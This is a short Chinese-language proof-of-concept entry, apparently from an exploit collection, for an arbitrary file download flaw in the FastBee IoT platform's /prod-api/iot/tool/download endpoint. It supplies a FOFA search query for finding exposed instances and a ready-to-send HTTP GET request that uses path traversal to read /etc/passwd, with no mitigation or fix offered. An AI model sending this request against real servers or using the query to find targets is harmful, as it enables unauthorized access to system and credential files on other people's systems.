# 蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞
蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa
"fastbee"

## poc
```plain
GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
Host:
Accept-Encoding: gzip, deflate, br
```

![image-20240925205550271](C:\Users\18484\AppData\Roaming\Typora\typora-user-images\image-20240925205550271.png)

![image-20240925205525480](C:\Users\18484\AppData\Roaming\Typora\typora-user-images\image-20240925205525480.png)
